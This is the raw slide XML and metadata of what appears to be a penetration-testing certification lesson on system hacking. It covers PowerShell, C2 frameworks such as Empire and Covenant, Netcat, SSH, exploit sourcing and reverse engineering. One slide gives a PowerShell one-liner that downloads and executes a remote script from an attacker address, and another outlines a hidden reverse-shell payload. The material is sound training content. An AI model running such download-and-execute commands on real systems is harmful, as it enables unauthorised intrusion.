            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Provides the basic functionality of the original .NET Framework. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Supersedes the original.NET Framework, which is still available and active</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Both .NET and .NET Framework have vulnerabilities that can be leveraged during the PenTest.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Windows with PowerShell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Windows PowerShell is a scripting language built on the .NET Framework and is the default shell on Windows 10.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Offers greater functionality than the traditional Windows CLI.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Supports a wide variety of programming elements.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Can automate the process of exploiting the following:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Registry, AD objects, Group Policy, the Windows network stack.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9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Discovering the Empire Framework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Empire is a Command-and-Control (C2) framework makes use of PowerShell for common post-exploitation tasks</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Runs Primarily on Windows, however has a Python component for Linux. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>With Empire, you can run PowerShell agents without needing powershell.exe (a scripting language interpreter).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Used to escalate privileges, launch other modules to capture data and extract passwords, and install persistent backdoors.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Other similar tools worth investigating include NoPowerShell, PowerLessShell, PowerShdll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30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43AD-3E39-4BC8-9E9D-99B34DF44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Covenant and Mythic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8464E-1C83-428E-A2D0-EF551FB4F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Covenant </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>is a collaborative C2 framework that highlights the attack surface of .NET and improves the ability to launch an attacks easier. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Covenant can run on Windows, Linux, and MacOS </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Mythic</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> is another cross-platform C2 framework </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Contains different payload types as well as ways to customize them when PenTesting a MacOS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2732B-A3A3-4DA4-969A-788ADBACFA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35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Outline why the team should be familiar with .NET and .NET Framework </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Describe the Windows PowerShell scripting language</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Outline how the team can use the Empire Framework during PenTesting</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Compare the Covenant and Mythic C2 Frameworks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Hacking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0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 Remote Access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14B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with Netcat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Netcat is a highly versatile command-line utility used to read from or write to TCP, UDP, or Unix domain socket network connections. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Can create or connect to a TCP server, act as a proxy or relay, and launch executables when a connection is made</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Can transfer files, test services and daemons, and port scan. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Netcat has been ported to most desktop platforms and has inspired similar tools such as Simple Netcat for Android and Ncat</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The basic syntax of Netcat is nc [options] [target address] [port(s)] and has several available options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16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with Ncat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Ncat is a tool developed for Nmap as an improvement over Netcat. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It uses the same syntax when executing commands and has the same options seen in Netcat’s options table. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Has additional functionality that is key to a penetration tester: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>It can encrypt communications with SSL so that the traffic is not visible to anyone on the network. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Conceals activity such as exfiltrating files or sending commands that could alert defenders or defense systems of your presence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6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Communicating within a Secure Shell (SSH)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SSH is a way to securely issue commands and copy files over an unsecured network. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>By default, you will need a credential to use it and, if configured with higher security levels, also a certificate and keypair.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SSH is commonly used by system administrators to remotely manage servers and other devices. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Has multiple features and options, and allows an ethical hacker to perform advanced tasks such as secure tunnels for pivoting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39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Explain how the team can use Netcat during the PenTest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Discuss how Ncat has additional functionality that is key to a penetration tester</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Review ways SSH can allow the team to securely communicate during the PenTest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Remote Access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48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334A-0A8F-4570-A91D-468192F8CD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Analyze Exploit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9D58A-425E-4AFF-8B6F-6914EE1DDC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14C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20C06-F6E3-4367-9B8F-1CC0589E3B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1ABB1-56A0-4E2B-B620-F831A79C7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289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Files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292929"/>
                </a:solidFill>
                <a:effectLst/>
              </a:rPr>
              <a:t>During the PenTest, the team may be tasked with using exploit code to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>download and execute a script.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The following is a single line of code that will give us leverage:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="342900" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:latin typeface="Lucida Console" panose="020B0609040504020204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>powershell.exe -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.0.100/run.ps1'))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The first element (powershell.exe –c) tells PowerShell to execute the following command block or script and then exit. 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“IEX” will execute an element inside the parenthesis which creates a new connection to our specified attacker and download a file called “run.ps1”.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63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Launching Remote Access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gain access to the target, the team may need to create a more advance script using msfvenom. Within the code, you will see:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Option –p specifies the payload “reverse_powershell”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Option -w hidden hides the window</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Option –nop tells PowerShell not to load any profile</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The rest of the code is more complex as it uses a while loop to keep alive until it successfully connects</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Instead of running just once and stopping.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177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Enumerating Users and Assets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Enumeration gathers information using a variety of tools and/or C2 frameworks designed for these tasks. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>One of the most common tools used is Meterpreter, an agent that is part of the Metasploit framework. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>We enumerate users and assets for the following reasons:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Users and usernames which could be used to attempt password techniques </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Assets which could be used to attack and pivot.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03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Exploiting a WordPress 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way to enumerate users is to use a vulnerable WordPress site </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>To achieve this, we can use an exploit script that references a URL. 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You will need to add the main website to be scanned and it will add some code to the URL adding a known location of a user file. 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The script will then repeatedly go to the modified URL and copy the information about users. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This is possible because as people rush to build a website, they often do not take the extra steps to properly configure security.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87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Locating Exploitation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Today there are numerous databases and collections of exploits you can query and research. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>In some cases, we may find code in a less reputable website or posted by an unknown user.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Prior to using the code, take into consideration the following:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>A knowledgeable hacker that can develop an exploit probably has the skills necessary to add harmful code into it</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Anyone who attempts to utilize the exploit may fall victim to malicious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10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Exploitation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application that an organization develops, maintains, or uses in-house will probably not have scripts freely available on the internet.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You may also find exploitation code difficult to find in the following situations:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Recently patched version is no longer vulnerable to known exploits</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Uncommon/less known software and no publicly available exploits</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>For scenarios like these, you can use specific analysis techniques on compiled software to see if you can compromise any applications.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63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Down a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Reverse engineering is the process of breaking down a program into its base components in order to reveal more about how it functions. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>If you don't have access to an app's source code, you may be able to capture information about the app during execution. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>This can enable you to reverse engineer the app to look for potential weaknesses in design, programming, or implementation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>When it comes to software, there are three primary methods of performing reverse engineering:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Decompilation, disassembly and debugging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7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6D36-6561-45FF-8E12-C25ADEE4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Decompiling a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DDDF5-5FE2-4F8B-9641-1ECDD9DB9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Translates an executable into high-level source code. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Decompiling a program can help you:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Recover lost source code, as well as examine malware. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Perform static code analysis to correct errors. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Help determine whether the app's logic will produce unintended results </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Some apps are easier to deconstruct than others. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>However, some languages and third-party tools are designed to obfuscate source code before it is compiled.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88380-13DF-4084-BEC6-EF2491378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81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217E1-C14A-490A-A120-1A0A3DD98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Disassembling the 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91D4A-0109-46AA-9F4E-FAF6522F8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Translates low-level machine code into assembly language </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Disassembly is a deterministic process, in that, a machine code instruction will always translate to the same assembly instruction. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>However, there are disadvantages when compared to decompilation:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Assembly is not as concise as high-level code: it is more repetitive, and the linear flow of the code is not as well structured </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>The process requires knowledge of assembly, which not many people possess.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8870B-DF2F-4998-A474-C41A14B2B2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19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BA241-55AD-4E41-9331-A4741253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F3E00-BEF8-43AD-8907-FEE64C96A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Manipulates a program's running state to analyze it for bugs, vulnerabilities, and other issues. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You can step through, halt, or otherwise modify portions of the program's underlying code, directly affecting the program as it executes.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Enables the team to perform static and dynamic analysis on the program to see its effect. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Makes it easier to understand how an app functions and how it might be vulnerable.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33EA1-8136-43CA-BBDB-14A9114D60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16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FF23-B385-4FE2-8035-582D8484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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>development Kit </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(SDK)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3C26B-9259-4500-A540-038A69C15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package of tools dedicated to a specific programming language or platform commonly used by developers while creating applications </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>An example is the development kit for Windows and its debugger, WinDbg. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Can contain other elements that you can leverage during your assessment</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You can develop and compile your own tools for a particular programming language or platform. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>There are several popular disassembler/debugger tools that include: Immunity Debugger, WinDbg, Ghidra, and Covenant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0A104-8EBE-4A05-8F97-01CDB8C63E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58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Describe methods the team can use to download files </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Explain how scripting can be used to achieve remote access </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Discuss why the team would enumerate users and assets </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Review considerations when downloading exploitation code </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Outline methods to break down a program to reveal more about how it functions</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>List components of a Software development Kit (SDK)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Exploit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381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Lesson 14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6269139-1795-4982-A1AD-DDEDBF1895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5a46270-66ec-4bdf-aabc-d78887d51418"/>
    <ds:schemaRef ds:uri="315eb565-7267-4a95-9087-2f433ded3c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04A4A-BEBA-46F7-8D91-096B77966F98}">
  <ds:schemaRefs>
    <ds:schemaRef ds:uri="http://purl.org/dc/elements/1.1/"/>
    <ds:schemaRef ds:uri="http://purl.org/dc/terms/"/>
    <ds:schemaRef ds:uri="http://schemas.microsoft.com/office/2006/documentManagement/types"/>
    <ds:schemaRef ds:uri="95a46270-66ec-4bdf-aabc-d78887d51418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315eb565-7267-4a95-9087-2f433ded3c8b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2908</TotalTime>
  <Words>2061</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>On-screen Show (16:9)</PresentationFormat>
  <Paragraphs>194</Paragraphs>
  <Slides>28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Lucida Console</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Open Sans</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>ui-monospace</vt:lpstr>
      <vt:lpstr>comptia_ov</vt:lpstr>
      <vt:lpstr>Exam PT0-002</vt:lpstr>
      <vt:lpstr>Performing System Hacking</vt:lpstr>
      <vt:lpstr>Objectives</vt:lpstr>
      <vt:lpstr>System Hacking</vt:lpstr>
      <vt:lpstr>Running with .NET and .NET Framework </vt:lpstr>
      <vt:lpstr>Managing Windows with PowerShell</vt:lpstr>
      <vt:lpstr>Discovering the Empire Framework </vt:lpstr>
      <vt:lpstr>Covenant and Mythic</vt:lpstr>
      <vt:lpstr>System Hacking</vt:lpstr>
      <vt:lpstr>Use Remote Access Tools</vt:lpstr>
      <vt:lpstr>Exploring with Netcat </vt:lpstr>
      <vt:lpstr>Monitoring with Ncat </vt:lpstr>
      <vt:lpstr>Communicating within a Secure Shell (SSH)</vt:lpstr>
      <vt:lpstr>Use Remote Access Tools</vt:lpstr>
      <vt:lpstr>Analyze Exploit Code</vt:lpstr>
      <vt:lpstr>Downloading Files </vt:lpstr>
      <vt:lpstr>Launching Remote Access </vt:lpstr>
      <vt:lpstr>Enumerating Users and Assets </vt:lpstr>
      <vt:lpstr>Exploiting a WordPress Site</vt:lpstr>
      <vt:lpstr>Locating Exploitation Code </vt:lpstr>
      <vt:lpstr>Downloading Exploitation Code </vt:lpstr>
      <vt:lpstr>Breaking Down a Program</vt:lpstr>
      <vt:lpstr>Decompiling a Program</vt:lpstr>
      <vt:lpstr>Disassembling the Source Code</vt:lpstr>
      <vt:lpstr>Debugging Software</vt:lpstr>
      <vt:lpstr>Software development Kit (SDK)</vt:lpstr>
      <vt:lpstr>Analyze Exploit Code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Danielle Andries</cp:lastModifiedBy>
  <cp:revision>13</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2021-09-23T15:15:08Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2022-10-19T21:50:36Z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  <property fmtid="{D5CDD505-2E9C-101B-9397-08002B2CF9AE}" pid="3" name="MediaServiceImageTags">
    <vt:lpwstr/>
  </property>
</Properties>
</file>